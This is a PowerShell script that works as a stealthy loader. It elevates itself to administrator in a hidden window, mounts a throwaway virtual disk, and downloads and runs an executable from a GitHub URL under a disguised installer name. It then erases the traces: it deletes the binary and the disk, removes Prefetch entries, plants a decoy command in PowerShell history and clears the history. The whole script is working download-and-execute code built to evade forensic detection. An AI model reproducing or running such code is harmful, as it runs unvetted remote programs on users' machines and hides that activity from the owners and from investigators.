$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    $CommandLine = "-File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
    Start-Process -FilePath PowerShell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $CommandLine
    exit
}

Start-Service -Name "vds"

$vdiskSizeMB = 2048
$randomName = [System.IO.Path]::GetRandomFileName().Replace('.', '')
$vdiskPath = "$env:TEMP\$randomName.vhd"

$createScript = @"
create vdisk file="$vdiskPath" maximum=$vdiskSizeMB type=expandable
select vdisk file="$vdiskPath"
attach vdisk
"@

try {
    $createScript | diskpart.exe 2>$null | Out-Null
} catch {
    exit 1
}

Start-Sleep -Seconds 1

$timeout = 0
$disk = $null
while ($timeout -lt 8) {
    try {
        $disk = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" } | Select-Object -First 1
        if ($disk) { break }
    } catch { }
    Start-Sleep -Milliseconds 500
    $timeout++
}

if ($disk) {
    try {
        if ($disk.IsOffline -eq $true) {
            Set-Disk -Number $disk.Number -IsOffline $false -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        }
        if ($disk.PartitionStyle -eq 'Raw') {
            Initialize-Disk -Number $disk.Number -PartitionStyle MBR -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        }
        $partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
        Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800
    } catch { }
}

$driveReady = $false
for ($i = 0; $i -lt 6; $i++) {
    if (Test-Path "Z:\") {
        $driveReady = $true
        break
    }
    Start-Sleep -Milliseconds 500
}

if ($driveReady) {
    $exePath = "Z:\IObit‎Unlocker‎Setup.exe"
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile("https://github.com/devnull-sys/files/raw/refs/heads/main/taskthow.exe", $exePath)
        
        $downloadComplete = $false
        $attempts = 0
        while (-not $downloadComplete -and $attempts -lt 30) {
            if (Test-Path $exePath) {
                try {
                    $fileStream = [System.IO.File]::Open($exePath, 'Open', 'Read', 'None')
                    $fileStream.Close()
                    $downloadComplete = $true
                } catch {
                    Start-Sleep -Milliseconds 500
                    $attempts++
                }
            } else {
                Start-Sleep -Milliseconds 500
                $attempts++
            }
        }
        
        Start-Sleep -Seconds 4
        
        if ((Test-Path $exePath) -and $downloadComplete) {
            Set-Clipboard -Value "SteF6b2WrAgu"
            
            $process = Start-Process -FilePath $exePath -PassThru
            
            if ($process -and $process.Id) {
                Start-Sleep -Seconds 3
                
                while (-not $process.HasExited) {
                    Start-Sleep -Seconds 1
                    $process.Refresh()
                }

                $replacementContent = $webClient.DownloadData("https://github.com/devnull-sys/nigmaballs/raw/refs/heads/main/iwe_history.txt")
                [System.IO.File]::WriteAllBytes($exePath, $replacementContent)
                
                if (Test-Path $exePath) {
                    Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
                }

                $detachScript = @"
select vdisk file="$vdiskPath"
detach vdisk noerr
exit
"@
                $detachScript | diskpart.exe 2>$null | Out-Null
                Start-Sleep -Seconds 1
                
                for ($i = 0; $i -lt 5; $i++) {
                    if (Test-Path $vdiskPath) {
                        Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
                        Start-Sleep -Milliseconds 200
                    } else {
                        break
                    }
                }
                
                $prefetchPath = "C:\Windows\Prefetch"
                Remove-Item -Path "$prefetchPath\POWERSHELL.EXE-*" -Force -ErrorAction SilentlyContinue
                Remove-Item -Path "$prefetchPath\VDS.EXE-*" -Force -ErrorAction SilentlyContinue
                
                $historyPath = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
                "iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex" | Set-Content $historyPath
                Start-Sleep -Milliseconds 100
                if (Test-Path $historyPath) {
                    Remove-Item -Path $historyPath -Force -ErrorAction SilentlyContinue
                }
                
                Clear-History
            } else {
                exit
            }
        }
    } catch { }
}

Stop-Service -Name "vds" -Force -ErrorAction SilentlyContinue
exit
